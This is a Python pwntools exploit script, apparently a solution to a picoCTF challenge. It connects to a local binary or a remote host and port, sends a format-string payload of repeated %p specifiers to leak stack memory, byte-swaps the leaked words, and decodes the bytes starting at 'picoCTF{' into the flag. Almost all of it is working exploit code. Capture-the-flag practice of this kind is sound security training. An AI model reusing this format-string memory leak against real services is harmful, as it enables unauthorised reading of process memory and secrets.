## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """

""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

def convert_endian(data: str):
    data = data[2:]
    reverse = ''.join([data[i:i+2] for i in range(0, len(data), 2)][::-1])
    reverse = "0x" + reverse
    return reverse

sleep(1)
payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
io.sendlineafter(b'you:', payload) 
data = str(io.recvall().decode().replace("Here's your order:", "").replace("(nil)", "").replace("Bye!", ""))
addresses_list = [convert_endian("0x" + part.replace("\n", "")) for part in data.split("0x") if part]
flag_addr = ""
add = False
for addr in addresses_list:
    try:
        ascii_string = bytes.fromhex(addr[2:]).decode('utf-8')
    except:
        sleep(0.1)
    if "picoCTF{" in ascii_string:
        flag_addr += addr[2:]
        add = True
    elif add == True:
        flag_addr += addr[2:]
    else:
        sleep(0.1)

sleep(1)

flag = ""
for i in range(0, len(flag_addr), 2):
    hex_pair = flag_addr[i:i+2]
    flag += chr(int(hex_pair, 16))
print(flag)